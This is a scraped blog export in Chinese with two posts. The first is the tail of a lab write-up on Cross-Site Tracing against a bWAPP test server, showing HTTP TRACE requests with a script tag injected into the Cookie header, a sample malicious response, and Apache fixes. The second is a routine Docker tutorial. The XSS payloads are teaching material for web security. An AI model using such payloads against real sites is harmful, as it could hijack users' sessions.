Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2 响应包： HTTP/1.1 200 OK Date: Fri, 29 Nov 2019 11:32:59 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html Content-Length: 819 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2 可以看到响应包 响应体中是原始请求报文，并且会下载一个php格式的文件，打开文件内容是原始请求报文。 0x05 漏洞概述 ​ 当服务器允许trace方法时，就可能存在跨站跟踪攻击。跨站跟踪攻击即CST攻击，是一种利用XSS和HTTP TRACE功能来进行攻击的方式。 ​ 攻击者可以在TRACE请求的响应中插入恶意脚本或者代码。例如，攻击者可以在响应中插入JavaScript代码来执行跨站脚本攻击（XSS攻击），或者在响应中插入重定向代码来将受害者重定向到恶意站点，当受害者浏览网站时，恶意脚本或者代码会被执行。攻击者可以利用恶意脚本或者代码来获取受害者的敏感信息、执行恶意操作等，导致cookie欺骗或者是中间人攻击。 攻击者向受害者发送一条包含TRACE请求的链接或者脚本。TRACE请求通常用于调试和测试Web服务器，可以将HTTP请求和响应回显给客户端。 当受害者点击链接或者运行脚本时，TRACE请求将被发送到目标Web服务器。由于TRACE请求会将HTTP请求和响应回显给客户端(依旧是响应页面的bp中,我们在http头中插入响应js脚本来攻击)，因此攻击者可以在响应中插入恶意脚本或者代码。 HTTP/1.1 200 OK Content-Type: text/html &lt;html&gt; &lt;head&gt; &lt;script&gt; alert('你的账号已被攻击'); // ... 进行其他恶意操作 &lt;/script&gt; &lt;/head&gt; &lt;body&gt; 正常的响应内容 &lt;/body&gt; &lt;/html&gt; 检测条件： 需要目标 Web 服务器允许接受 Trace、Track 方法的请求* 客户端可以发送 Trace、Track 方法的请求。（如今浏览器环境下已经杜绝这种请求） 0x06 漏洞验证 一、首先通过抓包工具拦截请求，修改请求包中的请求方法和请求包中的任意一个字段，下面以Cookie字段为例，在Cookie中插入XSS代码： TRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: &lt;script&gt;alert(\"TRACE XSS\")&lt;/script&gt; 二、修改响应包中的Content-Type:message/http，改为Content-Type:text/html： HTTP/1.1 200 OK Date: Fri, 29 Nov 2019 11:50:49 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html Content-Length: 570 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: &lt;script&gt;alert(\"TRACE XSS\")&lt;/script&gt; 发送请求后页面就会弹窗了。 0x07 修复建议 Apache服务器： 虚拟主机可以在.htaccess文件中添加如下代码过滤TRACE请求: RewriteEngine on RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK) RewriteRule .* - [F] 服务器用户在httpd.conf尾部添加如下指令后，重启apache即可: TraceEnable off Web 服务器限制 Trace、Track 方法的请求即可。 另如今， XMLHTTPRequest 已经杜绝了 Trace 与 Track 方法的请求（Chrome 25 版本及 FireFox 19 之后），如果尝试用 Trace / Track 方法请求，会抛出 SecurityError 异常，这也从根本上杜绝了 XST 攻击。 var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'http://localhost:3000/', false); xhr.send(null); if(200 == xhr.status) console.log(xhr.responseText); 0x08 其他补充： CST与XSS的比较: 相同点：都具有很大的欺骗性，可以对受害主机产生危害，而且这种攻击是多平台多技术的，我们还可以利用Active控件、Flash、Java等来进行CST和XSS攻击。 CST优点：可以绕过一般的http验证以及NTLM验证","categories":["常见攻击方法"]},{"title":"docker基础","path":"/2023/08/06/docker-jian-jie/","content":"1 Docker详解 1.1 是什么？ 1.1.1 问题：为什么会有docker出现？ 假定您在开发一个尚硅谷的谷粒商城，您使用的是一台笔记本电脑而且您的开发环境具有特定的配置。其他开发人员身处的环境配置也各有不同。您正在开发的应用依赖于您当前的配置且还要依赖于某些配置文件。此外，您的企业还拥有标准化的测试和生产环境，且具有自身的配置和一系列支持文件。您希望尽可能多在本地模拟这些环境而不产生重新创建服务器环境的开销。请问？ 您要如何确保应用能够在这些环境中运行和通过质量检测？并且在部署过程中不出现令人头疼的版本、配置问题，也无需重新编写代码和进行故障修复？ 答案就是使用容器。Docker之所以发展如此迅速，也是因为它对此给出了一个标准化的解决方案-----系统平滑移植，容器虚拟化技术。 环境配置相当麻烦，换一台机器，就要重来一次，费力费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。开发人员利用 Docker 可以消除协作编码时“在我的机器上可正常工作”的问题。 之前在服务器配置一个应用的运行环境，要安装各种软件，就拿尚硅谷电商项目的环境来说，Java/RabbitMQ/MySQL/JDBC驱动包等。安装和配置这些东西有多麻烦就不说了，它还不能跨平台。假如我们是在 Windows 上安装的这些环境，到了 Linux 又得重新装。况且就算不跨操作系统，换另一台同样操作系统的服务器，要移植应用也是非常麻烦的。 传统上认为，软件编码开发/测试结束后，所产出的成果即是程序或是能够编译执行的二进制字节码等(java为例)。而为了让这些程序可以顺利执行，开发团队也得准备完整的部署文件，让维运团队得以部署应用程式，开发需要清楚的告诉运维部署团队，用的全部配置文件+所有软件环境。不过，即便如此，仍然常常发生部署失败的状况。Docker的出现使得Docker得以打破过去「程序即应用」的观念。透过镜像(images)将作业系统核心除外，运作应用程式所需要的系统环境，由下而上打包，达到应用程式跨平台间的无缝接轨运作。 1.1.2 Docker理念 Docker是基于Go语言实现的云开源项目。 Docker的主要目标是“Build，Ship and Run Any App,Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次镜像，处处运行”。 Linux容器技术的出现就解决了这样一个问题，而 Docker 就是在它的基础上发展过来的。将应用打成镜像，通过镜像成为运行在Docker容器上面的实例，而 Docker容器在任何操作系统上都是一致的，这就实现了跨平台、跨服务器。只需要一次配置好环境，换到别的机子上就可以一键部署好，大大简化了操作。 1.1.3 一句话 解决了运行环境和配置问题的软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。 1.2 容器与虚拟机比较 1.2.1 容器发展简史 1.2.2 传统虚拟机技术 虚拟机（virtual machine）就是带环境安装的一种解决方案。 它可以在一种操作系统里面运行另一种操作系统，比如在Windows10系统里面运行Linux系统CentOS7。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。 虚拟机的缺点： 1 资源占用多 2 冗余步骤多 3 启动慢 1.2.3 容器虚拟化技术 由于前面虚拟机存在某些缺点，Linux发展出了另一种虚拟化技术： Linux容器(Linux Containers，缩写为 LXC) Linux容器是与系统其他部分隔离开的一系列进程，从另一个镜像运行，并由该镜像提供支持进程所需的全部文件。容器提供的镜像包含了应用的所有依赖项，因而在从开发到测试再到生产的整个过程中，它都具有可移植性和一致性。 Linux 容器不是模拟一个完整的操作系统而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。 1.2.4 对比 比较了 Docker 和传统虚拟化方式的不同之处： *传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程； *容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。 * 每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。 1.3 能干嘛 1.3.1 技术职级变化 coder -&gt; programmer -&gt; software engineer -&gt; DevOps engineer 1.3.2 开发/运维（DevOps）新一代开发工程师 1.3.2.1 一次构建、随处运行 更快速的应用交付和部署 传统的应用开发完成后，需要提供一堆安装程序和配置说明文档，安装部署后需根据配置文档进行繁杂的配置才能正常运行。Docker化之后只需要交付少量容器镜像文件，在正式生产环境加载镜像并运行即可，应用安装配置在镜像里已经内置好，大大节省部署配置和测试验证时间。 更便捷的升级和扩缩容 随着微服务架构和Docker的发展，大量的应用会通过微服务方式架构，应用的开发构建将变成搭乐高积木一样，每个Docker容器将变成一块“积木”，应用的升级将变得非常容易。当现有的容器不足以支撑业务处理时，可通过镜像运行新的容器进行快速扩容，使应用系统的扩容从原先的天级变成分钟级甚至秒级。 更简单的系统运维 应用容器化运行后，生产环境运行的应用可与开发、测试环境的应用高度一致，容器会将应用程序相关的环境和状态完全封装起来，不会因为底层基础架构和操作系统的不一致性给应用带来影响，产生新的BUG。当出现程序异常时，也可以通过测试环境的相同容器进行快速定位和修复。 更高效的计算资源利用 Docker是内核级虚拟化，其不像传统的虚拟化技术一样需要额外的Hypervisor支持，所以在一台物理机上可以运行很多个容器实例，可大大提升物理服务器的CPU和内存的利用率。 1.3.2.2 Docker应用场景 1.3.3 哪些企业在使用 新浪 美团 蘑菇街 1.4 去哪下 1.4.1 官网 docker官网：http://www.docker.com 1.4.2 仓库 Docker Hub官网: https://hub.docker.com/ 2 Docker安装 2.1 前提说明 CentOS Docker 安装 前提条件 目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在CentOS 7 (64-bit)上， 要求系统为64位、Linux系统内核版本为 3.8以上，这里选用Centos7.x 查看自己的内核 uname命令用于打印当前系统相关信息（内核版本号、硬件架构、主机名称和操作系统类型等）。 2.2 Docker的基本组成 Docker是一个Client-Server结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。可以对比mysql演示对比讲解 2.2.1 镜像(image) Docker 镜像（Image）就是一个只读的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。 它也相当于是一个root文件系统。比如官方镜像 centos:7 就包含了完整的一套 centos:7 最小系统的 root 文件系统。 相当于容器的“源代码”，docker镜像文件类似于Java的类模板，而docker容器实例类似于java中new出来的实例对象。 2.2.2 容器(container) 1 从面向对象角度 Docker 利用容器（Container）独立运行的一个或一组应用，应用程序或服务运行在容器里面，容器就类似于一个虚拟化的运行环境，容器是用镜像创建的运行实例。就像是Java中的类和实例对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器为镜像提供了一个标准的和隔离的运行环境，它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台 2 从镜像容器角度 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。 2.2.3 仓库(repository) 仓库（Repository）是集中存放镜像文件的场所。 类似于 Maven仓库，存放各种jar包的地方； github仓库，存放各种git项目的地方； Docker公司提供的官方registry被称为Docker Hub，存放各种镜像模板的地方。 仓库分为公开仓库（Public）和私有仓库（Private）两种形式。 最大的公开仓库是 Docker Hub(https://hub.docker.com/)， 存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云等。 2.2.4 小总结 需要正确的理解仓库/镜像/容器这几个概念: Docker 本身是一个容器运行载体或称之为管理引擎。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就是image镜像文件。只有通过这个镜像文件才能生成Docker容器实例(类似Java中new出来一个对象)。 image文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。 镜像文件 * image 文件生成的容器实例，本身也是一个文件，称为镜像文件。 容器实例 * 一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器 仓库 * 就是放一堆镜像的地方，我们可以把镜像发布到仓库中，需要的时候再从仓库中拉下来就可以了。 2.3 Docker平台架构图解(架构版) Docker 是一个 C/S 模式的架构，后端是一个松耦合架构，众多模块各司其职。 2.4 安装步骤 CentOS7安装Docker：https://docs.docker.com/engine/install/centos/ 2.4.1 确定你是CentOS7及以上版本 cat /etc/redhat-release 2.4.2 卸载旧版本 https://docs.docker.com/engine/install/centos/ 2.4.3 yum安装gcc相关 CentOS7能上外网 yum -y install gcc yum -y install gcc-c++ 2.4.4 安装需要的软件包 官网要求 执行命令 yum install -y yum-utils 2.4.5 设置stable镜像仓库 ❌ yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 报错： 1 [Errno 14] curl#35 - TCP connection reset by peer 2 [Errno 12] curl#35 - Timeout ✔️ yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 2.4.6 更新yum软件包索引 yum makecache fast 2.4.7 安装DOCKER CE yum -y install docker-ce docker-ce-cli containerd.io 官网要求 执行结果 2.4.8 启动docker systemctl start docker 2.4.9 测试 docker version docker run hello-world 2.4.10 卸载 systemctl stop docker yum remove docker-ce docker-ce-cli containerd.io rm -rf /var/lib/docker rm -rf /var/lib/containerd 2.5 阿里云镜像加速 是什么 https://promotion.aliyun.com/ntms/act/kubernetes.html 注册一个属于自己的阿里云账户(可复用淘宝账号) 获得加速器地址连接 登陆阿里云开发者平台 点击控制台 选择容器镜像服务 获取加速器地址 粘贴脚本直接执行 直接粘 或者分步骤都行 mkdir -p /etc/docker vim /etc/docker/daemon.json 重启服务器 systemctl daemon-reload systemctl restart docker 2.6 永远的HelloWorld 启动Docker后台容器(测试运行 hello-world) docker run hello-world 输出这段提示以后，hello world就会停止运行，容器自动终止。 run干了什么？ 2.7 底层原理 为什么Docker会比VM虚拟机快 (1)docker有着比虚拟机更少的抽象层 由于docker不需要Hypervisor(虚拟机)实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。 (2)docker利用的是宿主机的内核,而不需要加载操作系统OS内核 当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。进而避免引寻、加载操作系统内核返回等比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载OS,返回新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返回过程,因此新建一个docker容器只需要几秒钟。 3 Docker常用命令 3.1 帮助启动类命令 启动docker： systemctl start docker 停止docker： systemctl stop docker 重启docker： systemctl restart docker 查看docker状态： systemctl status docker 开机启动： systemctl enable docker 查看docker概要信息： docker info 查看docker总体帮助文档： docker --help 查看docker命令帮助文档： docker 具体命令 --help 3.2 镜像命令 3.2.1docker images 列出本地主机上的镜像 各个选项说明: REPOSITORY：表示镜像的仓库源 TAG：镜像的标签版本号 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 同一仓库源可以有多个 TAG版本，代表这个仓库源的不同个版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。 如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像 OPTIONS说明： -a :列出本地所有的镜像（含历史映像层） -q :只显示镜像ID。 3.2.2docker search 某个XXX镜像名字 网站：https://hub.docker.com 命令：docker search [OPTIONS] 镜像名字 OPTIONS说明： –limit : 只列出N个镜像，默认25个 docker search --limit 5 redis 3.2.3docker pull 某个XXX镜像名字 下载镜像 docker pull 镜像名字[:TAG] docker pull 镜像名字 没有TAG就是最新版 等价于 docker pull 镜像名字:latest docker pull ubuntu 3.2.4docker system df 查看镜像/容器/数据卷所占的空间 3.2.5docker rmi 某个XXX镜像名字ID 删除镜像 删除单个 docker rmi -f 镜像ID 删除多个 docker rmi -f 镜像名1:TAG 镜像名2:TAG 删除全部 docker rmi -f $(docker images -qa) 3.2.6 面试题：谈谈docker虚悬镜像是什么？ 是什么？ 仓库名、标签都是的镜像，俗称虚悬镜像dangling image 长什么样？ 3.3 容器命令 3.3.1 有镜像才能创建容器， 这是根本前提(下载一个CentOS或者ubuntu镜像演示) docker pull centos docker pull ubuntu 3.3.2 新建+启动容器 docker run [OPTIONS] IMAGE [COMMAND] [ARG...] OPTIONS说明 OPTIONS说明（常用）：有些是一个减号，有些是两个减号 --name=\"容器新名字\" 为容器指定一个名称；(不指定的话,系统随机指定) -d: 后台运行容器并返回容器ID，也即启动守护式容器(后台运行)； -i：以交互模式运行容器，通常与 -t 同时使用； -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用； 也即启动交互式容器(前台有伪终端，等待交互)； -P: 随机端口映射，大写P -p: 指定端口映射，小写 启动交互式容器(前台命令行) #使用镜像centos:latest以交互模式启动一个容器,在容器内执行/bin/bash命令。 docker run -it centos /bin/bash 参数说明： -i: 交互式操作。 -t: 终端。 centos : centos 镜像。 /bin/bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。 要退出终端，直接输入 exit: 3.3.3 列出当前所有正在运行的容器 docker ps [OPTIONS] OPTIONS说明（常用）： -a :列出当前所有正在运行的容器+历史上运行过的 -l :显示最近创建的容器。 -n：显示最近n个创建的容器。 -q :静默模式，只显示容器编号。 3.3.4 退出容器 两种退出方式 exit run进去容器，exit退出，容器停止 ctrl+p+q run进去容器，ctrl+p+q退出，容器不停止 3.3.5 启动已停止运行的容器 docker start 容器ID或者容器名 3.3.6 重启容器 docker restart 容器ID或者容器名 3.3.7 停止容器 docker stop 容器ID或者容器名 3.3.8 强制停止容器 docker kill 容器ID或容器名 3.3.9 删除已停止的容器 docker rm 容器ID 一次性删除多个容器实例 docker rm -f $(docker ps -a -q) docker ps -a -q | xargs docker rm 3.3.10 重要 有镜像才能创建容器，这是根本前提(下载一个Redis6.0.8镜像演示) 启动守护式容器(后台服务器) 在大部分的场景下，我们希望 docker 的服务是在后台运行的， 我们可以过 -d 指定容器的后台运行模式。 docker run -d 容器名 #使用镜像centos:latest以后台模式启动一个容器 docker run -d centos 问题：然后docker ps -a 进行查看, 会发现容器已经退出 很重要的要说明的一点: Docker容器后台运行,就必须有一个前台进程。 容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就是会自动退出的。 这个是docker的机制问题,比如你的web容器,我们以nginx为例，正常情况下,我们配置启动服务只需要启动响应的service即可。例如service nginx start。但是,这样做,nginx为后台进程模式运行,就导致docker前台没有运行的应用，这样的容器后台启动后，会立即自杀因为他觉得他没事可做了。所以，最佳的解决方案是将你要运行的程序以前台进程的形式运行，常见就是命令行模式，表示我还有交互操作，别中断。 redis 前后台启动演示case 前台交互式启动 docker run -it redis:6.0.8 后台守护式启动 docker run -d redis:6.0.8 查看容器日志 docker logs 容器ID 查看容器内运行的进程 docker top 容器ID 查看容器内部细节 docker inspect 容器ID 进入正在运行的容器并以命令行交互 docker exec -it 容器ID bashShell 重新进入docker attach 容器ID 上述两个区别？ attach 直接进入容器启动命令的终端，不会启动新的进程 用exit退出，会导致容器的停止。 exec 是在容器中打开新的终端，并且可以启动新的进程 用exit退出，不会导致容器的停止。 推荐大家使用 docker exec 命令，因为退出容器终端，不会导致容器的停止。 用之前的redis容器实例进入试试 进入redis服务 docker exec -it 容器ID /bin/bash docker exec -it 容器ID redis-cli 一般用-d后台启动的程序，再用exec进入对应容器实例 从容器内拷贝文件到主机上 容器→主机 docker cp 容器ID:容器内路径 目的主机路径 导入和导出容器 export 导出容器的内容留作为一个tar归档文件[对应import命令] import 从tar包中的内容创建一个新的文件系统再导入为镜像[对应export] 案例 docker export 容器ID &gt; 文件名.tar cat 文件名.tar | docker import - 镜像用户/镜像名:镜像版本号 3.4 小总结 attach Attach to a running container # 当前 shell 下 attach 连接指定运行镜像 build Build an image from a Dockerfile # 通过 Dockerfile 定制镜像 commit Create a new image from a container changes # 提交当前容器为新的镜像 cp Copy files/folders from the containers filesystem to the host path #从容器中拷贝指定文件或者目录到宿主机中 create Create a new container # 创建一个新的容器，同 run，但不启动容器 diff Inspect changes on a container's filesystem # 查看 docker 容器变化 events Get real time events from the server # 从 docker 服务获取容器实时事件 exec Run a command in an existing container # 在已存在的容器上运行命令 export Stream the contents of a container as a tar archive # 导出容器的内容流作为一个 tar 归档文件[对应 import ] history Show the history of an image # 展示一个镜像形成历史 images List images # 列出系统当前镜像 import Create a new filesystem image from the contents of a tarball # 从tar包中的内容创建一个新的文件系统映像[对应export] info Display system-wide information # 显示系统相关信息 inspect Return low-level information on a container # 查看容器详细信息 kill Kill a running container # kill 指定 docker 容器 load Load an image from a tar archive # 从一个 tar 包中加载一个镜像[对应 save] login Register or Login to the docker registry server # 注册或者登陆一个 docker 源服务器 logout Log out from a Docker registry server # 从当前 Docker registry 退出 logs Fetch the logs of a container # 输出当前容器日志信息 port Lookup the public-facing port which is NAT-ed to PRIVATE_PORT # 查看映射端口对应的容器内部源端口 pause Pause all processes within a container # 暂停容器 ps List containers # 列出容器列表 pull Pull an image or a repository from the docker registry server # 从docker镜像源服务器拉取指定镜像或者库镜像 push Push an image or a repository to the docker registry server # 推送指定镜像或者库镜像至docker源服务器 restart Restart a running container # 重启运行的容器 rm Remove one or more containers # 移除一个或者多个容器 rmi Remove one or more images # 移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除] run Run a command in a new container # 创建一个新的容器并运行一个命令 save Save an image to a tar archive # 保存一个镜像为一个 tar 包[对应 load] search Search for an image on the Docker Hub # 在 docker hub 中搜索镜像 start Start a stopped containers # 启动容器 stop Stop a running containers # 停止容器 tag Tag an image into a repository # 给源中镜像打标签 top Lookup the running processes of a container # 查看容器中运行的进程信息 unpause Unpause a paused container # 取消暂停容器 version Show the docker version information # 查看 docker 版本号 wait Block until a container stops, then print its exit code # 截取容器停止时的退出状态值 4 Docker镜像 4.1 是什么 是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，我们把应用程序和配置依赖打包好形成一个可交付的运行环境(包括代码、运行时需要的库、环境变量和配置文件等)，这个打包好的运行环境就是image镜像文件。 只有通过这个镜像文件才能生成Docker容器实例(类似Java中new出来一个对象)。 4.1.1 分层的镜像 以我们的pull为例，在下载的过程中我们可以看到docker的镜像好像是在一层一层的在下载 4.1.2 UnionFS（联合文件系统） UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。Union 文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。 特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录 4.1.3 Docker镜像加载原理 docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。 bootfs(boot file system)主要包含bootloader和kernel, bootloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是引导文件系统bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。 rootfs (root file system) ，在bootfs之上。包含的就是典型 Linux 系统中的 /dev, /proc, /bin, /etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。 平时我们安装进虚拟机的CentOS都是好几个G，为什么docker这里才200M？？ 对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供 rootfs 就行了。由此可见对于不同的linux发行版, bootfs基本是一致的, rootfs会有差别, 因此不同的发行版可以公用bootfs。 4.1.4 为什么 Docker 镜像要采用这种分层结构呢 镜像分层最大的一个好处就是共享资源，方便复制迁移，就是为了复用。 比如说有多个镜像都从相同的 base 镜像构建而来，那么 Docker Host 只需在磁盘上保存一份 base 镜像； 同时内存中也只需加载一份 base 镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。 4.2 重点理解 Docker镜像层都是只读的，容器层是可写的。当容器启动时，一个新的可写层被加载到镜像的顶部。 这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。 所有对容器的改动 - 无论添加、删除、还是修改文件都只会发生在容器层中。只有容器层是可写的，容器层下面的所有镜像层都是只读的。 4.3 Docker镜像commit操作案例 docker commit 提交容器副本使之成为一个新的镜像 docker commit -m=\"提交的描述信息\" -a=\"作者\" 容器ID 要创建的目标镜像名:[标签名] 4.3.1 案例演示ubuntu安装vim 从Hub上下载ubuntu镜像到本地并成功运行 原始的默认Ubuntu镜像是不带着vim命令的 外网连通的情况下，安装vim docker容器内执行上述两条命令： apt-get update apt-get -y install vim 安装完成后，commit我们自己的新镜像 启动我们的新镜像并和原来的对比 官网是默认下载的Ubuntu没有vim命令 我们自己commit构建的镜像，新增加了vim功能，可以成功使用。 4.3.2 小总结 Docker中的镜像分层，支持通过扩展现有镜像，创建新的镜像。类似Java继承于一个Base基础类，自己再按需扩展。 新镜像是从 base 镜像一层一层叠加生成的。每安装一个软件，就在现有镜像的基础上增加一层 5 本地镜像发布到阿里云 5.1 本地镜像发布到阿里云流程 5.2 镜像的生成方法 基于当前容器创建一个新的镜像，新功能增强 docker commit [OPTIONS] 容器ID [REPOSITORY[:TAG]] OPTIONS说明： -a :提交的镜像作者； -m :提交时的说明文字； 5.3 将本地镜像推送到阿里云 本地镜像素材原型 阿里云开发者平台 https://promotion.aliyun.com/ntms/act/kubernetes.html 5.3.1 创建仓库镜像 选择控制台，进入容器镜像服务 选择个人实例 命名空间 仓库名称 进入管理界面获得脚本 5.3.2 将镜像推送到阿里云 管理界面脚本 脚本实例 docker login --username=zzyybuy registry.cn-hangzhou.aliyuncs.com docker tag cea1bb40441c registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 docker push registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 上面命令是阳哥自己本地的，你自己酌情处理，不要粘贴我的。 5.4 将阿里云上的镜像下载到本地 docker pull registry.cn-hangzhou.aliyuncs.com/atguiguwh/myubuntu:1.1 6 本地镜像发布到私有库 6.1 是什么 1 官方Docker Hub地址：https://hub.docker.com/，中国大陆访问太慢了且准备被阿里云取代的趋势，不太主流。 2 Dockerhub、阿里云这样的公共镜像仓库可能不太方便，涉及机密的公司不可能提供镜像给公网，所以需要创建一个本地私人仓库供给团队使用，基于公司内部项目构建镜像。 Docker Registry是官方提供的工具，可以用于构建私有镜像仓库 6.2 将本地镜像推送到私有库 6.2.1 下载镜像Docker Registry docker pull registry 6.2.2 运行私有库Registry，相当于本地有个私有Docker hub docker run -d -p 5000:5000 -v /zzyyuse/myregistry/:/tmp/registry --privileged=true registry 默认情况，仓库被创建在容器的/var/lib/registry目录下，建议自行用容器卷映射，方便于宿主机联调 6.2.3 案例演示创建一个新镜像，ubuntu安装ifconfig命令 从Hub上下载ubuntu镜像到本地并成功运行 原始的Ubuntu镜像是不带着ifconfig命令的 外网连通的情况下，安装ifconfig命令并测试通过 docker容器内执行上述两条命令： apt-get update apt-get install net-tools 安装完成后，commit我们自己的新镜像 公式： docker commit -m=\"提交的描述信息\" -a=\"作者\" 容器ID 要创建的目标镜像名:[标签名] 命令：在容器外执行，记得 docker commit -m=\"ifconfig cmd add\" -a=\"zzyy\" 